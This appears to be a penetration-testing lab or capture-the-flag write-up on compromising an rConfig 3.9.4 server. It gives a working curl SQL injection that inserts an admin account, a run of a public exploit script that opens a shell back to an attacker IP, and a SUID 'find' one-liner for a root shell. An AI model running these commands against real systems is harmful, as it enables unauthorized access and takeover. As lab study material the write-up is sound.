#box

*Created: 1/10/2026*

### Step 1

**Tags:** #Common-Applications #Web-Applications #rConfig #MySQL #SQLi #Arbitrary-File-Upload

**Command:**
```bash
# SQLi to create the admin user

curl -k --path-as-is 'https://192.168.200.57:8081/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command%20;INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20(357,%20"gigi",%20"21232f297a57a5a743894a0e4a801fc3",%20"6c97424dc92f14ae78f8cc13cd08308d",%209,%20"gigi@domain.com",%201346920339,%201);--'

# Exploit to get a shell
python3 48241.py https://192.168.200.57:8081 pippo admin 192.168.45.213 139
```

*Port: 8081*

> 
> Our first target can be identified on port 8081. In fact, port 8081 on HTTPS exposes a rConfig instance, version 3.9.4. This version is vulnerable to various CVE. Some of them can also be chained but in particular we can have an Unauthenticated RCE throught a SQLi that first adds an user and then insidee the instance uploads a file that gets us a shell.
> 
> In our case we couldn't directly run a script because we had some issues with the SSL protocol.
> We opted to replicate this [exploit](https://www.exploit-db.com/exploits/48261) behaviour and tried to generate a custom user for us through that SQLi (in reality this script worked partially, at least till the user creation, than it failed for some compatibility reason making me think that there are some Python packages issue on my end).
> 
> Finally, once we could authenticate inside rConfig with a custom user just created following the exploit logic, we leveraged on another exploit to upload a file and gain a shell.
> In particular the exploit is [CVE-2020-10879](https://www.exploit-db.com/exploits/48241). With this we successfully got a shell on port 139.

---

### Step 2

**Tags:** #SUID #find

**Command:**
```bash
find . -exec /bin/sh -p \; -quit
```

> 
> Once landed on the machine, we discover the presence of a SUID on the `find` binary. Precisely at `/usr/bin/find`. Using the [GTFOBins](https://gtfobins.github.io/gtfobins/find/) we successfully get a root shell.

---

